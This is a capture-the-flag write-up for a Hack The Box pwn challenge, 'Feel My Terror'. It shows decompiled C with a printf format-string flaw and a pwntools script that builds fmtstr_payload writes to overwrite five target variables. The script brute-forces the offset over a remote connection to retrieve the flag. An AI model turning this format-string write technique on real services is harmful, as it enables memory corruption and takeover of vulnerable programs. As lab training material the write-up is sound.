# Feel My Terror
<img width="575" height="517" alt="image" src="https://github.com/user-attachments/assets/9e75061d-b41a-4f3c-81cb-1e07dae8953d" />

## Analyzing the binary
<img width="458" height="142" alt="image" src="https://github.com/user-attachments/assets/bee89364-aa0b-4535-9227-fcfb7997e505" />

IDA pro's decompiler reveals that the win condition is to write these values to their according addresses.
<img width="936" height="467" alt="writeup3" src="https://github.com/user-attachments/assets/5faf4955-c544-43ac-9e74-7adb374d374a" />

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // esi
  int v4; // edx
  int v5; // ecx
  int v6; // r8d
  int v7; // r9d
  int v8; // edx
  int v9; // ecx
  int v10; // r8d
  int v11; // r9d
  int v12; // edx
  int v13; // ecx
  int v14; // r8d
  int v15; // r9d
  __int64 buf; // [rsp+0h] [rbp-D0h] BYREF
  __int128 v18; // [rsp+B8h] [rbp-18h]
  unsigned __int64 v19; // [rsp+C8h] [rbp-8h]

  v19 = __readfsqword(0x28u);
  banner(argc, argv, envp);
  randomizer();
  *(_QWORD *)((char *)&v18 + 6) = 0;
  v3 = arg1;
  info(
    (unsigned int)"Look at the mess the ELVES made:\n"
                  "\n"
                  "--------------------\n"
                  "Address 1: 0x%x\n"
                  "Address 2: 0x%x\n"
                  "Address 3: 0x%x\n"
                  "Address 4: 0x%x\n"
                  "Address 5: 0x%x\n"
                  "--------------------\n",
    arg1,
    arg2,
    arg3,
    arg4,
    arg5,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    *((_QWORD *)&v18 + 1));
  info((unsigned int)"Please fix the addresses to help me deliver the gifts :)\n\n> ", v3, v4, v5, v6, v7);
  read(0, &buf, 0xC5u); // Look here
  info((unsigned int)"I hope the addresses you gave me are correct..\n\n", (unsigned int)&buf, v8, v9, v10, v11);
  printf((const char *)&buf); // and here, our input is passed directly as the format string, meaning that our program interprets user input not as data, but rather instructions.
  // %n, %hn and %hhn will write bytes, however I will let pwntools automatically construct the payload.
  fflush(_bss_start);
  info((unsigned int)"Checking the database...\n", (unsigned int)&buf, v12, v13, v14, v15);
  check_db();
  return 0;
}
```

## Abusing the format string vulnerability with pwntools to print our flag
```python
from pwn import *

context.binary = ELF("./feel_my_terror")
context.log_level = "error"

HOST = "XXX.XXX.XXX.XXX"
PORT = XXXXX
elf = context.binary

writes = {
    elf.symbols["arg1"]: 0xdeadbeef,
    elf.symbols["arg2"]: 0x1337c0de,
    elf.symbols["arg3"]: 0xf337babe,
    elf.symbols["arg4"]: 0x1337f337,
    elf.symbols["arg5"]: 0xfadeeeed,
}

for off in range(6, 80):
    p = remote(HOST, PORT)
    p.recvuntil(b">")

    payload = fmtstr_payload(off, writes, write_size="short")
    p.sendline(payload)

    out = p.recvall(timeout=2)
    if b"HTB{" in out:
        flag = out[out.index(b"HTB{"):out.index(b"}")+1]
        print(flag.decode())
        break
    p.close()
else:
    print("[-] Flag not found")
```

<img width="475" height="205" alt="image" src="https://github.com/user-attachments/assets/2a36794c-4152-4bff-82a5-78e4cc8ab4b4" />
